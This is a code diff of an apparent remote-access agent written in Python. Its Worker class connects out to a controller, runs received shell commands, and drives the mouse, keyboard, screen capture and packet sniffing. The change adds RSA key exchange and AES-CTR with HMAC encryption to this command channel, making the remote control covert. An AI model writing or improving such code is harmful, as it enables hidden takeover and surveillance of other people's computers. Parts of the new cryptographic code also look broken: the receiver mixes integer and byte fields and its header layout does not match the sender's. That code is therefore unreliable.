@@ -5,7 +5,11 @@ from typing import Callable
 import os
 import struct
 import subprocess
-
+from encryption.rsa import rsa
+import hashlib
+from encryption.DHE.my_hmac import HMAC
+from encryption.aes.aes_types import CTR
+import hmac
 import cv2
 import numpy as np
 import pyautogui
@@ -14,8 +18,7 @@ from pynput.mouse import Button,Controller
 from scapy.all import sniff
 from scapy.utils import wrpcap
 import mss
-from io import BytesIO
-from PIL import Image
+
 
 def cmd(command:str) ->bytes:
     return os.popen(command).read().encode()
@@ -135,6 +138,11 @@ class Worker:
         self.functions = functions
         self.client = socket.socket()
         self.stream_client = socket.socket()
+        self.private_key, self.public_key = rsa.rsa_keys(rsa.distant_random_primes(1024))
+        self.rsa = rsa.RSA(my_public_key=self.public_key, my_private_key=self.private_key)
+        self.own_master_key = os.urandom(32)
+        self.peer_master_key = None
+
 
 
     def connect(self):
@@ -143,8 +151,11 @@ class Worker:
                 self.client.connect(self.address)
                 self.client.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
 
-                self.client.send("connected".encode())
+                self.sender(self.rsa.dump_my_public_key(),seal=False)
+                self.rsa.load_peer_public_key(self.receiver(open_seal=False))
+                self.sender(self.rsa.send(self.own_master_key, hashlib.sha256(self.own_master_key).digest()), seal=False)
                 self.stream_client.connect((self.address[0],self.address[1]+1))
+                self.peer_master_key = self.rsa.receive(self.receiver(open_seal=False)).encode()
 
                 print("connection succeeded")
                 break
@@ -154,10 +165,63 @@ class Worker:
                 time.sleep(5)
                 self.client = socket.socket()
 
+    def derive_own_keys(self):
+        enc = hashlib.sha256(b"ENC" + self.own_master_key).digest()[:16]
+        mac = hashlib.sha256(b"MAC" + self.own_master_key).digest()
+        return enc, mac
 
-    def sender(self,sock: socket.socket, message:bytes):
-        data = struct.pack("I", len(message)) + message
-        sock.send(data)
+    def derive_peer_keys(self):
+        enc = hashlib.sha256(b"ENC" + self.peer_master_key).digest()[:16]
+        mac = hashlib.sha256(b"MAC" + self.peer_master_key).digest()
+        return enc, mac
+
+    def receiver(self, stream: bool = False, open_seal: bool = True) -> bytes:
+        if stream:
+            sock = self.stream_client
+        else:
+            sock = self.client
+
+        size = self.recvall(sock, 4)
+        if not size:
+            return b""
+        size = struct.unpack("I", size)[0]
+        if size < 1 + 4 + 8 + 32:
+            return b"error: Truncated message"
+        blob = self.recvall(sock, size)
+        if open_seal:
+            aes_key, mac_key = self.derive_peer_keys()
+            aad = struct.unpack("I", blob[0:4])[0]
+            nonce = blob[4:12]
+            tag = blob[-32:]
+            c = blob[12:-32]
+            header = aad + nonce
+            to_mac = header + c
+            calc = HMAC("sha256", to_mac, mac_key).derive()
+            if not hmac.compare_digest(calc, tag):
+                return b"error: Authentication failed"
+            ctr = CTR(aes_key, nonce)
+            return ctr.decrypt(c)
+
+        else:
+            return blob
+
+    def sender(self, message: bytes, stream: bool = False, seal: bool = True):
+        if stream:
+            client_sock = self.stream_client
+        else:
+            client_sock = self.client
+        if seal:
+            aes_key, mac_key = self.derive_own_keys()
+            nonce = os.urandom(8)
+            ctr = CTR(aes_key, nonce)
+            c = ctr.encrypt(message)
+            header = struct.pack("I", len(message)) + nonce
+            to_mac = header + c
+            tag = HMAC("sha256", to_mac, mac_key).derive()
+            data = struct.pack("I", len(header + c + tag)) + header + c + tag
+        else:
+            data = struct.pack("I", len(message)) + message
+        client_sock.sendall(data)
 
     def recvall(self,sock: socket.socket, size: int) -> bytes:
         data = b""
@@ -168,20 +232,11 @@ class Worker:
             data += packet
         return data
 
-    def receiver(self,sock: socket.socket) -> bytes:
-        raw_size = self.recvall(sock,4)
-        if not raw_size:
-            return b""
-        size = struct.unpack("I", raw_size)[0]
-        if size == 0:
-            return b""
-        message = self.recvall(sock, size)
-        return message
 
     def run(self):
         self.connect()
         while True:
-            data = self.receiver(self.client)
+            data = self.receiver()
             if data == "quit":
                 break
             if b":" in data:
@@ -196,9 +251,9 @@ class Worker:
 
             message = self.functions[name](commend)
             if name not in ["control_mouse", "press_key_in_worker", "live_stream"]:
-                self.sender(self.client,message)
+                self.sender(message)
             elif name == "live_stream":
-                self.sender(self.stream_client,message)
+                self.sender(message,stream=True)
         self.client.close()
 
 
